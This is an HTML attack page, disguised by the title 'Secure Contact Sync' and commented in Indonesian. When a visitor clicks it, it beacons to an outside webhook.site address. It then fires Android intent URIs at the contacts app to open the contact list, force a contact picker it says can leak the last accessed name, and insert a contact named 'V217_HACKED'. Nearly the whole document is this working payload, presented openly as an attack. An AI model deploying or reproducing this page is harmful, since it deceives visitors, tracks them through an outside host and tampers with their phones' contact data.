<!DOCTYPE html>
<html>
<head><title>Secure Contact Sync</title></head>
<body style="background:#000;color:#fa0;font-family:'Courier New',monospace;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden">
    <div id="ignite" style="padding:60px;border:3px solid #fa0;text-align:center;cursor:pointer;background:rgba(255,170,0,0.05);box-shadow:0 0 80px #fa0;border-radius:15px">
        <h1 style="letter-spacing:10px;margin:0">V217_CONTACTS</h1>
        <div id="status" style="font-size:20px;margin:20px 0;color:#fff">ACCESSING_CONTACT_DATABASE...</div>
        <div style="font-size:11px;color:#444">> TARGET: com.android.contacts</div>
    </div>

<script>
    const webhook = "https://webhook.site/47108fd1-d2d2-405b-91e0-30e6d35aa632";

    document.getElementById('ignite').onclick = () => {
        // 1. SILENT RECON
        navigator.sendBeacon(`${webhook}?v=V217_CONTACTS`, btoa(JSON.stringify({ts: Date.now(), act: "CONTACT_JUMP"})));

        // 2. THE AGGRESSIVE CONTACT INTENTS
        // Jalur A: Membuka Daftar Kontak Utama
        const intentA = "intent:#Intent;action=android.intent.action.VIEW;data=content://contacts/people/;package=com.android.contacts;end";
        
        // Jalur B: Memaksa Jendela "Pick Contact" (Seringkali membocorkan nama terakhir yang diakses)
        const intentB = "intent:#Intent;action=android.intent.action.PICK;type=vnd.android.cursor.dir/contact;package=com.android.contacts;end";

        // Jalur C: Shortcut untuk menambah kontak baru (Injeksi data)
        const intentC = "intent:#Intent;action=android.intent.action.INSERT;type=vnd.android.cursor.dir/contact;S.name=V217_HACKED;S.phone=08123456789;end";

        // 3. THE EXECUTION
        document.getElementById('status').innerText = "PENETRATING_CONTACT_APP...";
        document.getElementById('status').style.color = "#f00";

        // Tembak jalur utama
        window.location.href = intentA;

        // Tembak jalur seleksi (Jika jalur utama diblokir browser)
        setTimeout(() => {
            const a = document.createElement('a');
            a.href = intentB;
            a.click();
        }, 200);

        // Fallback: Jika masih di browser, coba injeksi kontak baru
        setTimeout(() => {
            if (!document.hidden) {
                window.location.replace(intentC);
            }
        }, 600);
    };
</script>
</body>
</html>
